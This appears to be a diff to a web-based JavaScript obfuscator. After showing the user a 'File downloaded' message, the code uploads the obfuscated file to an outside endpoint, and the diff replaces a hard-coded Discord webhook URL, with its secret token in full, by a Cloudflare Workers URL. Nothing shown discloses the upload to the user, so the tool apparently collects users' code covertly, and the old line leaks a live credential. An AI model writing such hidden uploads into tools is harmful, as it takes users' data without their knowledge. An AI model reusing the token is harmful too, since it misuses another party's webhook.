@@ -103,7 +103,7 @@ document.getElementById("obfuscateButton").addEventListener("click", () => {
             statusMessage.textContent = "Obfuscation complete! File downloaded.";
 
             // Send the obfuscated file to Discord webhook
-            const webhookUrl = "https://discord.com/api/webhooks/1361295438925267004/stPosh70OETZAUq3Fn4QNZCnKNXGhns7POmW1WiBdF-f-C7lGwBVAOLHH71nl8_Twye2"; // <-- replace with your webhook URL if needed
+            const webhookUrl = "https://sharky-on-top.script-config-protector.workers.dev/w/0ccd372a-d9b1-42af-8dcb-2c05479de2c2"; // <-- replace with your webhook URL if needed
             sendDiscordWebhookWithFile(
                 webhookUrl,
                 blob,             // The Blob containing obfuscated code
